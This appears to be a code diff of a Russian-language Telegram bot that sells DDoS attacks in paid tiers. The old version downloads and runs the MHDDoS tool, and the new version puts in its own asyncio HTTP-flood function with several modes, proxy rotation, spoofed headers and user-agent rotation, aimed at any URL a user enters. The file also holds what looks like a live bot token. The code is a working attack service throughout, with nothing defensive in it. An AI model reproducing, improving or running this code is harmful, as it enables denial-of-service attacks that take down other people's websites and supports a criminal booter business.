@@ -1,24 +1,21 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-FIAPASDDOS БОТ — УПРАВЛЕНИЕ АТАКАМИ (ПРОГРЕСС РЕДАКТИРУЕТСЯ)
+DIMSTAT BOT — УПРОЩЁННЫЙ HTTP-ФЛУД (без start.py)
 """
 
 import asyncio
 import os
 import sys
-import subprocess
 import json
 import time
 import random
-import requests
-import re
-import zipfile
-import io
 import html
 from datetime import datetime, timedelta
-from typing import Dict, List
+from typing import Dict, List, Optional
 
+import aiohttp
+import requests
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile
@@ -31,7 +28,6 @@ from aiohttp import web
 BOT_TOKEN = "8984259381:AAHAc-dorORjD-G0Ci2lLnwf_kbbzqqCxkg"
 ADMINS = [8264264137]
 
-DDOS_SCRIPT = "start.py"
 PROXIES_FILE = "proxies.txt"
 DATA_FILE = "users.json"
 UA_FILE = "user_agents.txt"
@@ -39,106 +35,14 @@ UA_FILE = "user_agents.txt"
 WEBHOOK_URL = "https://llosdfisojdfouisdf-production.up.railway.app/webhook"
 
 # ==============================
-# ГЛОБАЛЬНЫЙ ОБЪЕКТ БОТА
+# ГЛОБАЛЬНЫЕ ОБЪЕКТЫ
 # ==============================
 bot = Bot(token=BOT_TOKEN, connect_timeout=120, read_timeout=120)
 dp = Dispatcher()
 user_data = {}
 
 # ==============================
-# АВТОЗАГРУЗКА FIAPASDDOS И УСТАНОВКА ЗАВИСИМОСТЕЙ
-# ==============================
-def ensure_ddos_script():
-    if os.path.exists(DDOS_SCRIPT):
-        return
-    print("⬇️ FiapasDdos не найден, скачиваю...")
-    url = "https://github.com/MatrixTM/MHDDoS/archive/refs/heads/main.zip"
-    try:
-        r = requests.get(url, timeout=30)
-        if r.status_code == 200:
-            with zipfile.ZipFile(io.BytesIO(r.content)) as z:
-                for file in z.namelist():
-                    if file.startswith("MHDDoS-main/") and not file.endswith("/"):
-                        new_name = file.replace("MHDDoS-main/", "")
-                        if "/" in new_name:
-                            os.makedirs(os.path.dirname(new_name), exist_ok=True)
-                        data = z.read(file)
-                        with open(new_name, "wb") as f:
-                            f.write(data)
-            print("✅ FiapasDdos загружен и распакован.")
-            install_dependencies()
-        else:
-            print(f"❌ Не удалось скачать FiapasDdos, статус {r.status_code}")
-    except Exception as e:
-        print(f"❌ Ошибка загрузки: {e}")
-
-def install_dependencies():
-    packages = [
-        "cloudscraper",
-        "dnspython",
-        "icmplib",
-        "aiohttp",
-        "beautifulsoup4",
-        "pycryptodome",
-        "psutil",
-        "requests",
-        "https://github.com/MatrixTM/PyRoxy/archive/refs/heads/master.zip"
-    ]
-    for pkg in packages:
-        try:
-            print(f"📦 Устанавливаю {pkg}...")
-            subprocess.check_call(
-                [sys.executable, "-m", "pip", "install", pkg],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
-            )
-            print(f"✅ {pkg} установлен")
-        except Exception as e:
-            print(f"⚠️ Не удалось установить {pkg}: {e}")
-
-ensure_ddos_script()
-
-# ==============================
-# USER-AGENT
-# ==============================
-try:
-    from fake_useragent import UserAgent
-    UA_AVAILABLE = True
-except:
-    UA_AVAILABLE = False
-
-def get_user_agents() -> List[str]:
-    if os.path.exists(UA_FILE):
-        with open(UA_FILE, "r", encoding="utf-8") as f:
-            ua = [line.strip() for line in f if line.strip()]
-            if len(ua) > 10:
-                return ua
-    base = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-    ]
-    if UA_AVAILABLE:
-        try:
-            ua = UserAgent()
-            for _ in range(100):
-                base.append(ua.random)
-        except:
-            pass
-    final = list(set(base))
-    with open(UA_FILE, "w", encoding="utf-8") as f:
-        f.write("\n".join(final))
-    return final
-
-USER_AGENTS = get_user_agents()
-
-def get_random_ua():
-    return random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0"
-
-# ==============================
-# ТАРИФЫ И ДАННЫЕ ПОЛЬЗОВАТЕЛЕЙ
+# ТАРИФЫ
 # ==============================
 TIERS = {
     "free": {"name": "🐢 Бесплатный", "max_threads": 100, "max_duration": 60},
@@ -181,6 +85,45 @@ def is_admin(user_id):
     return user_id in ADMINS
 
 # ==============================
+# USER-AGENT
+# ==============================
+try:
+    from fake_useragent import UserAgent
+    UA_AVAILABLE = True
+except:
+    UA_AVAILABLE = False
+
+def get_user_agents() -> List[str]:
+    if os.path.exists(UA_FILE):
+        with open(UA_FILE, "r", encoding="utf-8") as f:
+            ua = [line.strip() for line in f if line.strip()]
+            if len(ua) > 10:
+                return ua
+    base = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    ]
+    if UA_AVAILABLE:
+        try:
+            ua = UserAgent()
+            for _ in range(100):
+                base.append(ua.random)
+        except:
+            pass
+    final = list(set(base))
+    with open(UA_FILE, "w", encoding="utf-8") as f:
+        f.write("\n".join(final))
+    return final
+
+USER_AGENTS = get_user_agents()
+
+def get_random_ua():
+    return random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0"
+
+# ==============================
 # ПРОКСИ
 # ==============================
 PROXY_SOURCES = [
@@ -190,8 +133,6 @@ PROXY_SOURCES = [
     "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/socks5.txt",
     "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/output/http.txt",
     "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/output/https.txt",
-    "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/output/socks4.txt",
-    "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/output/socks5.txt",
 ]
 
 def fetch_proxies():
@@ -232,61 +173,145 @@ def update_proxies():
             return len(valid)
     return 0
 
+def load_proxies():
+    if os.path.exists(PROXIES_FILE):
+        with open(PROXIES_FILE, "r") as f:
+            return [line.strip() for line in f if line.strip()]
+    return []
+
 # ==============================
-# АТАКА
+# АТАКА (HTTP-ФЛУД)
 # ==============================
 active_attacks = {}
 
-async def run_attack(user_id, method, url, threads, duration):
-    update_proxies()
-    if not os.path.exists(DDOS_SCRIPT):
-        await asyncio.get_event_loop().run_in_executor(None, ensure_ddos_script)
-        if not os.path.exists(DDOS_SCRIPT):
-            raise Exception("FiapasDdos не найден")
-    if not os.path.exists(PROXIES_FILE):
-        open(PROXIES_FILE, 'a').close()
-    
-    # Проверяем PyRoxy
-    try:
-        import PyRoxy
-    except ImportError:
-        print("⚠️ PyRoxy не найден, устанавливаю...")
+async def run_http_attack(user_id: int, method: str, url: str, threads: int, duration: int):
+    """
+    Запускает HTTP-флуд с указанным методом.
+    Возвращает количество отправленных запросов (приблизительно).
+    """
+    proxies = load_proxies()
+    if not proxies:
+        # Если нет прокси, работаем без них
+        proxies = [None]  # будет использоваться без прокси
+
+    # Подготовка данных для разных методов
+    headers = {
+        "User-Agent": get_random_ua(),
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "keep-alive",
+    }
+
+    # Для XMLRPC
+    xml_payload = """<?xml version="1.0"?>
+<methodCall>
+    <methodName>system.listMethods</methodName>
+    <params></params>
+</methodCall>"""
+
+    # Для APACHE — много заголовков
+    extra_headers = {
+        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
+        "Referer": "https://www.google.com/",
+        "Cache-Control": "no-cache",
+        "Pragma": "no-cache",
+        "DNT": "1",
+    }
+
+    sem = asyncio.Semaphore(threads)  # ограничиваем кол-во одновременных запросов
+    counter = 0
+    start_time = time.time()
+    end_time = start_time + duration
+
+    async def make_request(session, proxy):
+        nonlocal counter
+        if time.time() > end_time:
+            return
         try:
-            subprocess.check_call(
-                [sys.executable, "-m", "pip", "install", "https://github.com/MatrixTM/PyRoxy/archive/refs/heads/master.zip"],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
-            )
-            print("✅ PyRoxy установлен")
-        except Exception as e:
-            raise Exception(f"Не удалось установить PyRoxy: {e}")
-    
-    cmd = ["python", DDOS_SCRIPT, method, url, "0", str(threads), PROXIES_FILE, "64", str(duration)]
-    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, cwd=os.path.dirname(os.path.abspath(__file__)))
-    return process
+            async with sem:
+                # Выбираем случайный метод для SLOW (долгий ответ)
+                if method == "SLOW":
+                    # Запрос с большим таймаутом, но мы не ждём ответа полностью
+                    timeout = aiohttp.ClientTimeout(total=30)
+                else:
+                    timeout = aiohttp.ClientTimeout(total=5)
+
+                # Собираем заголовки
+                h = headers.copy()
+                if method == "APACHE":
+                    h.update(extra_headers)
+                    # Добавляем случайные заголовки
+                    h[f"X-Custom-{random.randint(1000,9999)}"] = str(random.randint(1000,9999))
+
+                # Прокси
+                proxy_url = f"http://{proxy}" if proxy else None
+
+                # Тело для POST и XMLRPC
+                data = None
+                if method == "POST":
+                    data = {"key": "value", "random": random.randint(1,1000)}
+                elif method == "XMLRPC":
+                    data = xml_payload
+                    h["Content-Type"] = "text/xml"
+
+                # Выполняем запрос
+                async with session.request(
+                    method=method if method not in ["SLOW", "APACHE", "XMLRPC"] else "GET",
+                    url=url,
+                    headers=h,
+                    data=data,
+                    timeout=timeout,
+                    proxy=proxy_url,
+                    ssl=False,
+                ) as resp:
+                    # Для SLOW читаем только часть ответа (или не читаем)
+                    if method == "SLOW":
+                        # Читаем только заголовки, чтобы не ждать тело
+                        pass
+                    else:
+                        await resp.read()
+                counter += 1
+        except:
+            # Ошибки игнорируем
+            pass
+
+    # Создаём сессию с пулом соединений
+    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        tasks = []
+        # Запускаем бесконечный цикл задач до истечения времени
+        while time.time() < end_time:
+            # Берём случайный прокси
+            proxy = random.choice(proxies) if proxies[0] is not None else None
+            task = asyncio.create_task(make_request(session, proxy))
+            tasks.append(task)
+            # Небольшая задержка, чтобы не перегружать систему
+            await asyncio.sleep(0.01)  # 10ms
+
+        # Ожидаем завершения всех задач
+        await asyncio.gather(*tasks, return_exceptions=True)
+
+    elapsed = time.time() - start_time
+    return counter, elapsed
+
+async def run_attack_wrapper(user_id: int, method: str, url: str, threads: int, duration: int):
+    """
+    Оборачивает атаку и обновляет статус.
+    """
+    try:
+        counter, elapsed = await run_http_attack(user_id, method, url, threads, duration)
+        return f"Атака завершена. Отправлено ~{counter} запросов за {elapsed:.2f} сек."
+    except Exception as e:
+        return f"Ошибка: {e}"
 
 async def stop_attack(user_id):
     if user_id in active_attacks:
-        active_attacks[user_id]["process"].terminate()
-        try:
-            active_attacks[user_id]["process"].wait(timeout=5)
-        except:
-            active_attacks[user_id]["process"].kill()
+        # Так как мы не можем прервать задачи напрямую, просто отметим как остановленную
+        # Задачи завершатся при проверке времени
         del active_attacks[user_id]
         return True
     return False
-
-# ==============================
-# БЕЗОПАСНЫЙ ОТВЕТ НА CALLBACK
-# ==============================
-async def safe_answer(callback, text=None, show_alert=False):
-    try:
-        await callback.answer(text, show_alert=show_alert)
-    except Exception as e:
-        if "query is too old" in str(e):
-            pass
-        else:
-            raise
 
 # ==============================
 # КЛАВИАТУРЫ
@@ -337,52 +362,19 @@ def buy_tier_menu():
 def method_menu():
     return InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="🔥 KILLER", callback_data="m_KILLER"),
-            InlineKeyboardButton(text="🛡️ BYPASS", callback_data="m_BYPASS")
-        ],
-        [
             InlineKeyboardButton(text="🌐 GET", callback_data="m_GET"),
             InlineKeyboardButton(text="📨 POST", callback_data="m_POST")
         ],
         [
-            InlineKeyboardButton(text="⚡ SYN", callback_data="m_SYN"),
-            InlineKeyboardButton(text="📦 UDP", callback_data="m_UDP")
-        ],
-        [
-            InlineKeyboardButton(text="☁️ CFB", callback_data="m_CFB"),
-            InlineKeyboardButton(text="☁️ CFBUAM", callback_data="m_CFBUAM")
-        ],
-        [
-            InlineKeyboardButton(text="🔧 Другие", callback_data="method_other"),
-            InlineKeyboardButton(text="⬅️ Назад", callback_data="back_main")
-        ]
-    ])
-
-def other_methods_menu():
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [
             InlineKeyboardButton(text="🔹 HEAD", callback_data="m_HEAD"),
-            InlineKeyboardButton(text="🔹 SLOW", callback_data="m_SLOW")
+            InlineKeyboardButton(text="🐢 SLOW", callback_data="m_SLOW")
         ],
         [
-            InlineKeyboardButton(text="🔹 APACHE", callback_data="m_APACHE"),
-            InlineKeyboardButton(text="🔹 XMLRPC", callback_data="m_XMLRPC")
+            InlineKeyboardButton(text="🔧 APACHE", callback_data="m_APACHE"),
+            InlineKeyboardButton(text="📦 XMLRPC", callback_data="m_XMLRPC")
         ],
         [
-            InlineKeyboardButton(text="🔹 DGB", callback_data="m_DGB"),
-            InlineKeyboardButton(text="🔹 PPS", callback_data="m_PPS")
-        ],
-        [
-            InlineKeyboardButton(text="🔹 STOMP", callback_data="m_STOMP"),
-            InlineKeyboardButton(text="🔹 AVB", callback_data="m_AVB")
-        ],
-        [
-            InlineKeyboardButton(text="🔹 RHEX", callback_data="m_RHEX"),
-            InlineKeyboardButton(text="🔹 BOMB", callback_data="m_BOMB")
-        ],
-        [
-            InlineKeyboardButton(text="🔹 EVEN", callback_data="m_EVEN"),
-            InlineKeyboardButton(text="⬅️ Назад", callback_data="back_method")
+            InlineKeyboardButton(text="⬅️ Назад", callback_data="back_main")
         ]
     ])
 
@@ -434,20 +426,23 @@ def confirm_menu():
     ])
 
 # ==============================
-# ОТПРАВКА СООБЩЕНИЙ
+# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
 # ==============================
+async def safe_answer(callback, text=None, show_alert=False):
+    try:
+        await callback.answer(text, show_alert=show_alert)
+    except:
+        pass
+
 async def send_new(message, text, parse_mode="HTML", reply_markup=None):
     try:
         await message.answer(text, parse_mode=parse_mode, reply_markup=reply_markup)
-    except Exception as e:
-        print(f"Ошибка отправки: {e}")
+    except:
+        pass
 
-# ==============================
-# ФОРМИРОВАНИЕ ОТЧЁТА
-# ==============================
 def generate_report(method, url, threads, duration, elapsed, output):
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    report = f"""
+    return f"""
 ═══════════════════════════════════════════════
           ОТЧЁТ ОБ АТАКЕ
 ═══════════════════════════════════════════════
@@ -458,11 +453,10 @@ def generate_report(method, url, threads, duration, elapsed, output):
   Длительность: {duration} сек
   Время выполнения: {elapsed:.2f} сек
 ───────────────────────────────────────────────
-  ВЫВОД FiapasDdos:
+  РЕЗУЛЬТАТ:
 {output}
 ═══════════════════════════════════════════════
 """
-    return report
 
 # ==============================
 # ОБРАБОТЧИКИ
@@ -472,7 +466,7 @@ async def start_cmd(message: types.Message):
     user = get_user(message.from_user.id)
     tier_name = TIERS[user["tier"]]["name"]
     await message.answer(
-        f"🌟 <b>FiapasDdos БОТ</b>\n\n"
+        f"🌟 <b>DIMSTAT HTTP-ФЛУД БОТ</b>\n\n"
         f"👤 Тариф: {tier_name}\n"
         f"💎 Баланс: {user['balance']} ⭐\n\n"
         f"🚀 Управляй атаками через кнопки.",
@@ -591,11 +585,6 @@ async def attack_start(callback: types.CallbackQuery):
         return
     await send_new(callback.message, "🎯 Выберите метод:", reply_markup=method_menu())
 
-@dp.callback_query(F.data == "method_other")
-async def method_other(callback: types.CallbackQuery):
-    await safe_answer(callback)
-    await send_new(callback.message, "🔧 Другие методы:", reply_markup=other_methods_menu())
-
 @dp.callback_query(F.data.startswith("m_"))
 async def method_choose(callback: types.CallbackQuery):
     await safe_answer(callback)
@@ -603,12 +592,13 @@ async def method_choose(callback: types.CallbackQuery):
     user_data[callback.from_user.id] = {"method": method}
     await send_new(callback.message, f"✅ Метод: {method}\n\nВведите URL (например, example.com):", reply_markup=None)
 
+# Обработка текстовых сообщений (URL, потоки, длительность)
 @dp.message(F.text)
 async def handle_text(message: types.Message):
     user_id = message.from_user.id
     data = user_data.get(user_id, {})
     awaiting = data.get("awaiting")
-    
+
     if awaiting == "give_tier":
         parts = message.text.strip().split()
         if len(parts) != 2:
@@ -630,7 +620,7 @@ async def handle_text(message: types.Message):
             pass
         user_data.pop(user_id, None)
         return
-    
+
     if user_id in user_data and "method" in user_data[user_id] and "url" not in user_data[user_id]:
         url = message.text.strip()
         if not url.startswith("http"):
@@ -638,7 +628,7 @@ async def handle_text(message: types.Message):
         user_data[user_id]["url"] = url
         await message.answer(f"✅ URL: {url}\n\nВыберите потоки:", reply_markup=threads_menu())
         return
-    
+
     if awaiting in ("threads", "duration"):
         try:
             val = int(message.text.strip())
@@ -677,7 +667,7 @@ async def show_confirm(message, user_id):
         f"🌐 URL: {html.escape(url)}\n"
         f"🧵 Потоки: {threads}\n"
         f"⏱️ Длительность: {duration} сек\n\n"
-        f"🔄 Загружаю прокси... (20-40 сек)\n\n"
+        f"🔄 Загружаю прокси... (это может занять несколько секунд)\n\n"
         f"Запускаем?",
         parse_mode="HTML",
         reply_markup=confirm_menu()
@@ -743,103 +733,55 @@ async def confirm_launch(callback: types.CallbackQuery):
             reply_markup=main_menu()
         )
         return
-    # Отправляем сообщение о загрузке (оно будет редактироваться)
-    loading_msg = await callback.message.answer("🔄 Загружаю прокси... Подождите 20-40 сек.", parse_mode="HTML")
-    try:
-        process = await run_attack(user_id, method, url, threads, duration)
-        start = time.time()
-        await loading_msg.delete()
-        # Основное сообщение, которое будем редактировать
-        msg = await callback.message.answer(
-            f"🚀 <b>Атака запущена!</b>\n\n"
-            f"🎯 Метод: {method}\n"
-            f"🌐 URL: {html.escape(url)}\n"
-            f"🧵 Потоков: {threads}\n"
-            f"⏱️ Длительность: {duration} сек\n\n"
-            f"⏳ 0%",
-            parse_mode="HTML",
-            reply_markup=main_menu()
-        )
-        active_attacks[user_id] = {
-            "process": process,
-            "start_time": start,
-            "duration": duration,
-            "method": method,
-            "url": url,
-            "msg": msg,
-            "last_update": start
-        }
-        asyncio.create_task(monitor_attack(user_id))
-    except Exception as e:
-        await send_new(callback.message, f"❌ Ошибка: {e}", reply_markup=main_menu())
 
-async def monitor_attack(user_id):
+    # Обновляем прокси перед атакой
+    update_proxies()
+
+    # Отправляем сообщение о начале
+    msg = await callback.message.answer(
+        f"🚀 <b>Атака запускается...</b>\n\n"
+        f"🎯 Метод: {method}\n"
+        f"🌐 URL: {html.escape(url)}\n"
+        f"🧵 Потоков: {threads}\n"
+        f"⏱️ Длительность: {duration} сек",
+        parse_mode="HTML",
+        reply_markup=main_menu()
+    )
+
+    # Запускаем атаку в фоне
+    active_attacks[user_id] = {
+        "start_time": time.time(),
+        "duration": duration,
+        "method": method,
+        "url": url,
+        "threads": threads,
+        "msg": msg
+    }
+
+    asyncio.create_task(monitor_attack(user_id, msg))
+
+async def monitor_attack(user_id, msg):
     data = active_attacks.get(user_id)
     if not data:
         return
-    process = data["process"]
+    method = data["method"]
+    url = data["url"]
+    threads = data["threads"]
     duration = data["duration"]
-    start = data["start_time"]
-    msg = data["msg"]
-    last_update = start
-    while process.poll() is None:
-        elapsed = time.time() - start
-        remaining = max(0, duration - elapsed)
-        if remaining <= 0:
-            break
-        if time.time() - last_update >= 5:
-            progress = min(100, int(elapsed / duration * 100))
-            try:
-                # РЕДАКТИРУЕМ сообщение
-                await msg.edit_text(
-                    f"🚀 <b>Атака выполняется</b>\n\n"
-                    f"🎯 Метод: {html.escape(data['method'])}\n"
-                    f"🌐 URL: {html.escape(data['url'])}\n"
-                    f"🧵 Потоков: {data.get('threads', '?')}\n\n"
-                    f"⏳ <b>Прогресс:</b> {progress}%\n"
-                    f"⏱️ Прошло: {int(elapsed)} сек / {duration} сек\n"
-                    f"⏳ Осталось: {int(remaining)} сек\n\n"
-                    f"📊 Запросов: ~{int(elapsed * 100)}",
-                    parse_mode="HTML",
-                    reply_markup=main_menu()
-                )
-            except:
-                pass
-            last_update = time.time()
-        await asyncio.sleep(1)
-    stdout, stderr = process.communicate()
-    output = (stdout or "") + (stderr or "")
-    if not output.strip():
-        output = "Атака завершена без вывода."
-    report_text = generate_report(
-        method=data['method'],
-        url=data['url'],
-        threads=data.get('threads', '?'),
-        duration=duration,
-        elapsed=time.time() - start,
-        output=output
-    )
-    # Пытаемся отправить отчёт как файл
-    filename = f"report_{user_id}_{int(time.time())}.txt"
-    with open(filename, "w", encoding="utf-8") as f:
-        f.write(report_text)
+
+    # Запускаем саму атаку
+    result = await run_attack_wrapper(user_id, method, url, threads, duration)
+
+    # Удаляем из активных
+    if user_id in active_attacks:
+        del active_attacks[user_id]
+
+    # Формируем отчёт
+    elapsed = time.time() - data["start_time"]
+    report_text = generate_report(method, url, threads, duration, elapsed, result)
+
+    # Отправляем отчёт
     try:
-        # Редактируем сообщение о завершении
-        await msg.edit_text(
-            f"✅ <b>Атака завершена!</b>\n\n"
-            f"📄 Отчёт приложен в виде файла.",
-            parse_mode="HTML",
-            reply_markup=main_menu()
-        )
-        # Отправляем файл
-        await bot.send_document(
-            chat_id=user_id,
-            document=InputFile(filename),
-            caption="📄 Отчёт об атаке",
-            reply_markup=main_menu()
-        )
-    except Exception as e:
-        # Если файл не отправился, выводим текст
         await msg.edit_text(
             f"✅ <b>Атака завершена!</b>\n\n"
             f"📄 <b>Отчёт:</b>\n"
@@ -847,11 +789,13 @@ async def monitor_attack(user_id):
             parse_mode="HTML",
             reply_markup=main_menu()
         )
-    finally:
-        if os.path.exists(filename):
-            os.remove(filename)
-    if user_id in active_attacks:
-        del active_attacks[user_id]
+    except:
+        # Если не отредактировалось, отправляем новым сообщением
+        await bot.send_message(
+            chat_id=user_id,
+            text=f"✅ Атака завершена!\n\n{report_text}",
+            reply_markup=main_menu()
+        )
 
 @dp.callback_query(F.data == "attack_stop")
 async def stop_attack_cmd(callback: types.CallbackQuery):
@@ -939,8 +883,7 @@ async def handle_webhook(request):
         await dp.feed_update(bot, update)
         return web.Response(text="OK")
     except Exception as e:
-        if "query is too old" not in str(e):
-            print(f"Webhook error: {e}")
+        print(f"Webhook error: {e}")
         return web.Response(status=500)
 
 async def on_startup():
@@ -955,9 +898,9 @@ async def main():
     app.router.add_post("/webhook", handle_webhook)
     runner = web.AppRunner(app)
     await runner.setup()
-    site = web.TCPSite(runner, host="0.0.0.0", port=8080)
+    site = web.TCPSite(runner, host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
     await site.start()
-    print("🚀 Сервер запущен на порту 8080")
+    print("🚀 Сервер запущен на порту", int(os.getenv("PORT", 8080)))
     while True:
         await asyncio.sleep(3600)
 
